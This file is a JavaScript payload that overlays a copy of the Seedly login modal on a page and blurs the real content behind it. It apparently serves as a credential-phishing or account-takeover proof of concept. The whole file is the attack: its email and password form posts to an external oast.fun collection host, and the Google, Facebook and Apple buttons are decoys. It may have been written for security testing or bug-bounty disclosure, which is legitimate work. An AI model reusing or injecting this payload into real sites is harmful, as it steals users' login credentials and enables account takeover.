(function() {
  // === CREATE DARK OVERLAY (NO BLUR ON MODAL) ===
  const overlay = document.createElement('div');
  overlay.id = 'seedly-ato-overlay';
  overlay.style.cssText = `
    position:fixed;top:0;left:0;width:100%;height:100%;
    background:rgba(0,0,0,0.85);z-index:999998;
    display:flex;justify-content:center;align-items:center;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  `;
  document.body.appendChild(overlay);

  // === BLUR ONLY THE ORIGINAL PAGE (NOT MODAL) ===
  const pageContent = document.querySelector('body > *:not(#seedly-ato-overlay)') || document.body;
  if (pageContent && pageContent !== overlay) {
    pageContent.style.transition = 'filter 0.3s ease';
    pageContent.style.filter = 'blur(8px)';
  }

  // === INSERT EXACT SEEDLY LOGIN MODAL ===
  overlay.innerHTML = `
    <div style="
      background:#1a1a1a;border-radius:16px;padding:32px;
      max-width:400px;width:90%;color:#fff;
      box-shadow:0 20px 40px rgba(0,0,0,0.4);text-align:center;
    ">
      <h2 style="margin:0 0 24px;font-size:24px;font-weight:600;">Log in to Seedly</h2>

      <!-- SOCIAL BUTTONS -->
      <button type="button" style="
        width:100%;padding:14px;margin:10px 0;border-radius:12px;
        background:#fff;color:#000;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      " onclick="alert('Social login blocked in demo')">
        <img src="https://seedly.sg/assets/google-g.png" width="20" alt="G">
        Continue with Google
      </button>

      <button type="button" style="
        width:100%;padding:14px;margin:10px 0;border-radius:12px;
        background:#1877f2;color:#fff;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      ">
        <img src="https://seedly.sg/assets/facebook-f.png" width="20" alt="f" style="filter:brightness(0)invert(1);">
        Continue with Facebook
      </button>

      <button type="button" style="
        width:100%;padding:14px;margin:10px 0;border-radius:12px;
        background:#000;color:#fff;font-weight:600;font-size:15px;
        border:none;cursor:pointer;display:flex;align-items:center;
        justify-content:center;gap:12px;
      ">
        <img src="https://seedly.sg/assets/apple.png" width="20" alt="Apple">
        Continue with Apple
      </button>

      <div style="margin:20px 0;color:#666;font-size:14px;">OR</div>

      <!-- EMAIL + PASS FORM -->
      <form action="https://abzfdgjdobpnrmlcfsqo5jrtg5ghq5wu6.oast.fun" method="POST">
        <input type="email" name="email" placeholder="Your email" required style="
          width:100%;padding:14px;margin:8px 0;border-radius:12px;
          border:1px solid #444;background:#2a2a2a;color:#fff;
          font-size:15px;outline:none;
        ">
        <input type="password" name="password" placeholder="Your password" required style="
          width:100%;padding:14px;margin:8px 0;border-radius:12px;
          border:1px solid #444;background:#2a2a2a;color:#fff;
          font-size:15px;outline:none;
        ">
        <a href="#" style="color:#4fd1c5;font-size:13px;display:block;margin:12px 0;text-align:right;">
          Forgot your password?
        </a>
        <button type="submit" style="
          width:100%;padding:15px;margin:10px 0;border-radius:12px;
          background:#4fd1c5;color:#000;font-weight:bold;
          font-size:16px;border:none;cursor:pointer;
        ">Login</button>
      </form>

      <p style="margin-top:20px;font-size:14px;color:#aaa;">
        New to Seedly? 
        <a href="#" style="color:#4fd1c5;text-decoration:none;">Create an account</a>
      </p>
    </div>
  `;

  // === CLOSE ON CLICK OUTSIDE OR ESC ===
  overlay.addEventListener('click', e => {
    if (e.target === overlay) {
      overlay.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && overlay) {
      overlay.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });
})();
